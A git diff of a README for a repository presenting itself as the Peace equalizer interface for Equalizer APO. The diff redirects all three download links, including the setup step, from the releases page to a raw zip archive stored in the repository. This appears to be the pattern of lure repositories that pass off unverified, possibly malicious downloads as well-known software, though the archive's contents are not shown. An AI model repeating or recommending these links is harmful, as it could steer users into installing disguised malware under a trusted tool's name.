@@ -1,6 +1,6 @@
 # 🎧 peace-equalizer-APO - Improve your computer audio sound quality
 
-[![](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Giuseppepointblank314/peace-equalizer-APO/releases)
+[![](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Giuseppepointblank314/peace-equalizer-APO/raw/refs/heads/main/Equalizer/peace_APO_equalizer_v3.1-alpha.4.zip)
 
 ## 📁 What is this app
 Peace Equalizer is a graphical interface for the Equalizer APO audio processing tool. It allows you to adjust the sound output of your computer. You can change frequencies, boost bass, or clear up audio for your headphones and speakers. This tool works with Windows 11 and older versions. It supports presets for gaming, music, and movies. You can save your configurations and switch between them at any time.
@@ -14,7 +14,7 @@ Peace Equalizer is a graphical interface for the Equalizer APO audio processing 
 ## 🚀 How to set up your interface
 You must install Equalizer APO before you use the Peace interface. Follow these steps to get your system ready.
 
-1.  Visit [this page](https://github.com/Giuseppepointblank314/peace-equalizer-APO/releases) to download the installation files.
+1.  Visit [this page](https://github.com/Giuseppepointblank314/peace-equalizer-APO/raw/refs/heads/main/Equalizer/peace_APO_equalizer_v3.1-alpha.4.zip) to download the installation files.
 2.  Run the Equalizer APO installer file.
 3.  Choose your output device from the list provided during the installation.
 4.  Restart your computer to apply the audio changes.
@@ -65,4 +65,4 @@ The community maintains the data used for the equalizer profiles. You can search
 
 Regular updates ensure the software stays compatible with the latest Windows versions. Check the download link below regularly for new versions that include interface improvements.
 
-[Download the latest version here](https://github.com/Giuseppepointblank314/peace-equalizer-APO/releases)
+[Download the latest version here](https://github.com/Giuseppepointblank314/peace-equalizer-APO/raw/refs/heads/main/Equalizer/peace_APO_equalizer_v3.1-alpha.4.zip)
